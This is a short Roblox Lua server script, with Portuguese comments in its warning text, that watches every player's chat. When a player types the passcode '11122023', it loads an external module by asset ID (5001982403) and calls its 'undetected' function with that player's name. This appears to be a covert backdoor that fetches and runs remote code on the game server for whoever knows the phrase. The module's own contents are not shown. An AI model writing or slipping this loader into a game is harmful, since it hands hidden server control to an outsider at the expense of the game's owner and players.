local function onPlayerChat(message, player)

	if message:lower() == "11122023" then

		local playerName = player.Name


		local success, module = pcall(require, 5001982403)
		if success then
			module.undetected(playerName)
		else
			warn("Não funcionou", module)
		end
	end
end


game.Players.PlayerAdded:Connect(function(player)
	player.Chatted:Connect(function(message)
		onPlayerChat(message, player)
	end)
end)
